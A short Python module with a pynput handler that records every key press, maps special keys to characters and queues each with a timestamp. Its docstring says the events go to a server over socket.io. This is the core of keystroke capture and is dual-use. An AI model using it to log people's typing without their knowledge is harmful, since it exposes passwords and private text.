from __future__ import annotations

import time
from queue import Queue

from pynput.keyboard import Key, KeyCode

translate_key = {
    'space': ' ',
    'enter': '\n',
    'tab': '\t',
}


def on_key(key:  (Key | KeyCode | None), queue: Queue):
    """Handle key press event from pynput and send to server via socket.io."""
    try:
        key_value = ''
        if hasattr(key, 'char') and key.char is not None:
            # Regular character key
            key_value = key.char
        else:
            # Special key (Key.space, Key.enter, etc.)
            key_name = str(key).replace('Key.', '').lower()
            key_value = translate_key.get(key_name, key_name)

        queue.put({
            "event": key_value,
            "timestamp": time.time()
        })
    except Exception as e:
        pass
